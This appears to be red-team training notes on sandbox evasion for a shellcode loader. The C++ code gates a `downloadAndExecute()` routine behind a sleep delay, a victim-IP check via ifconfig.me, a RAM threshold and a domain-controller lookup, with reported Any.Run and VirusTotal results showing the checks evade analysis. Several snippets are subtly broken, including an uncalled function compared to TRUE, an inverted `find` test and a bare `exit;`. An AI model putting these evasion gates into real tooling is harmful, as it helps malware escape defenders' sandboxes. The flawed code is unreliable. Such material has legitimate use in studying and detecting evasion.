# Implementing evasion techniques

## Taking a Nap

Take the template code from [Common sandbox evasion techniques](techniques.md) and add a Sleep statement for 120,000ms 
to it. This translates to roughly 120 seconds or 2 minutes. Generally, you would want a time closer to 5 minutes to 
be sure; but 2 minutes will suffice for testing purposes: 

```text
int main() {
    Sleep(120000);
    downloadAndExecute();
    return 0;
} 
```

Compile and upload the code to [Any.Run](http://any.run/):

* [Sleep Bypass](https://app.any.run/tasks/0799e9b3-dddc-4838-ba2d-c95fc0a7e63b)
* [No Sleep Bypass](https://app.any.run/tasks/ad3cf5b4-1bdf-4005-8578-507334f5c8ac)

A simple technique, incredibly powerful and has allowed us to run out Any.Run's one-minute timer. This method may or 
may not work due to various blog posts that have been published showing how Blue Teamers can create sleep timer 
bypasses. A better implementation could be to waste computing time by doing heavy math.

## Geolocation Filtering

Leveraging Geolocation blocks. Fortunately, there is a good amount of code that is already written for us. Portions 
of the `downloadAndExecute()` function can be re-used for this:

* Website URL (formerly the `c2URL` variable)
* Internet Stream (formerly the `stream` variable)
* String variable (formerly the `s` variable)
* Buffer Space (formerly the `Buff` variable)
* Bytes Read (formerly the `unsigned long bytesRead` variable)
* Lastly, the `URLOpenBlockingStreamA` function

```text
BOOL checkIP() {   
 // Declare the Website URL that we would like to vicit
    const char* websiteURL = "<https://ifconfig.me/ip>";   
 // Create an Internet Stream to access the website
    IStream* stream;   
 // Create a string variable where we will store the string data received from the website
    string s;   
  // Create a space in memory where we will store our IP Address
    char buff[35];   
    unsigned long bytesRead;   
 // Open an Internet stream to the remote website
    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);   
 // While data is being sent from the webserver, write it to memory
    while (true) {       
        stream->Read(buff, 35, &bytesRead);       
        if (0U == bytesRead) {           
            break;       
        }       
        s.append(buff, bytesRead);   
    }   
  // Compare if the string is equal to the targeted victim's IP. If true, return the check is successful. Else, fail the check.
    if (s == "VICTIM_IP") {       
        return TRUE;   
    }   
    else {       
    return FALSE;   
    }
} 
```

Modify `main`:

```text
int main(){
    if(checkIP() == TRUE){
        downloadAndExecute();
        return 0;
    }
    else {
        cout << "HTTP/418 - I'm a Teapot!";
        return 0;
    }
}
```

Compile and upload the code to [Any.Run](http://any.run/):

* [with an IP Address Filter](https://app.any.run/tasks/dbc2e81a-d7da-4ee5-a628-a5d2d17a0c1a)
* [without an IP Address Filter](https://app.any.run/tasks/6c721d61-b06a-4497-84fd-1aea34671085)

`ifconfig.me` is flagged as a `questionable/Potentially Malicious `site used to check for your external IP Address. 
This Sandbox evasion method ended up hurting our score, so it should be used as a last resort or with a recently 
deployed/custom IP Address checking server. 

## Checking system information

Start off the System Information category with - the amount of RAM a system has. It is important to note that 
Windows measures data in a non-standard format. If you have ever bought a computer that said it has 
"256GB of SSD Storage", after turning it on, you would have closer to 240GB. This is because Windows measures data 
in units of 1024-bytes instead of 1000-bytes. This can get confusing very quickly. Fortunately for us, we will be 
working in such small amounts of memory that accuracy can be a best guess instead of an exact number. Now that we 
know this, how can we determine how much memory is installed on the System?

We only need the Windows header file included, and we can call a specific Windows API, 
[GlobalMemoryStatusEx](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-globalmemorystatusex), 
to retrieve the data:

1. Declare the [MEMORYSTATUSEX](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-memorystatusex) struct
2. Set the size of the `dwLength` member to the size of the struct
3. Call the `GlobalMemoryStatusEx` Windows API to populate the struct with the memory information
4. We want the total amount of physical memory installed on the system, so we will print out the `ullTotalPhys` member 
of the `MEMORYSTATUSEX` struct to get the size of the memory installed in the system in Bytes. 
5. Divide by 1024 3x to get the value of memory installed in GiB. 

In C++:

```text
#include <iostream>
#include <Windows.h>
using namespace std;
int main() {
// Declare the MEMORYSTATUSEX Struct    
   MEMORYSTATUSEX statex;
// Set the length of the struct to the size of the struct    
   statex.dwLength = sizeof(statex);
// Invoke the GlobalMemoryStatusEx Windows API to get the current memory info    
   GlobalMemoryStatusEx(&statex);
// Print the physical memory installed on the system    
   cout << "There is " << statex.ullTotalPhys/1024/1024/1024 << "GiB of memory on the system.";
} 
```

Most Sandboxes have 4GB of RAM dedicated to the machine, so we should check and see if the memory count is greater 
than 5; if it is not, exit the program; if it is, continue execution. 

```text
BOOL memoryCheck() {
// This function will check and see if the system has 5+GB of RAM
// Declare the MEMORYSTATUSEX Struct    
    MEMORYSTATUSEX statex;
// Set the length of the struct to the size of the struct    
    statex.dwLength = sizeof(statex);
// Invoke the GlobalMemoryStatusEx Windows API to get the current memory info    
    GlobalMemoryStatusEx(&statex);
// Checks if the System Memory is greater than 5.00GB    
    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 5.00) {        
       return TRUE;    
    } else {        
       return FALSE;
    }
}

int main() {
// Evaluates if the installed RAM amount is greater than 5.00 GB,
//if true download Shellcode, if false, exit the program.    
if (memoryCheck() == TRUE) {        
    downloadAndExecute();    
    } else {        
       exit;    
    }
return 0;
} 
```

Compile and upload the code to [Any.Run](http://any.run/):

* [with the Memory Check function](https://app.any.run/tasks/e2f6a64b-02ef-43ca-bea5-e724b234001c)
* [without the Memory Check function](https://app.any.run/tasks/6c721d61-b06a-4497-84fd-1aea34671085)

In the first submission, our memory check function works without any issue and gracefully exits the program when it 
notices the device has less than 5GB of RAM. The code functions as intended.

## Querying Network Information

Querying information about the Active Directory domain can be kept simple by querying the name of a Domain Controller 
using the [NetGetDCName](https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netgetdcname) Windows 
API.

```text
BOOL isDomainController(){
// Create a long pointer to Wide String for our DC Name to live in
    LPCWSTR dcName;  
// Query the NetGetDCName Win32 API for the Domain Controller Name
    NetGetDCName(NULL, NULL, (LPBYTE *) &dcName);
// Convert the DCName from a Wide String to a String
    wstring ws(dcName);
    string dcNewName(ws.begin(), ws.end());
// Search if the UNC path is referenced in the dcNewName variable. If so, there is likely a Domain Controller present in the environment. If this is true, pass the check, else, fail.
    if ( dcNewName.find("\\\\"){
          return TRUE;
    } else {
          return FALSE;
    }
} 

int main() {
    if (isDomainController == TRUE) {
        downloadAndExecute();
    } else {
        cout << "Domain Controller Not Found!";
    }
} 
```

Compile and upload to VirusTotal: Looking at the results of the SysInternals Sandbox, we can see that the Sandbox 
evasion technique worked. No outbound request to Cloudflare was made. 

## Adding External Dependencies in Visual Studio

To add a new DLL to the project file, 

1. Open project, right-click on the Project name in the "Solution Explorer".
2. Click Properties at the bottom of the list; this will open a new view. 
3. Expand the "Linker" tab and select the "Input" submenu. 
4. Add the Netapi32 Library.


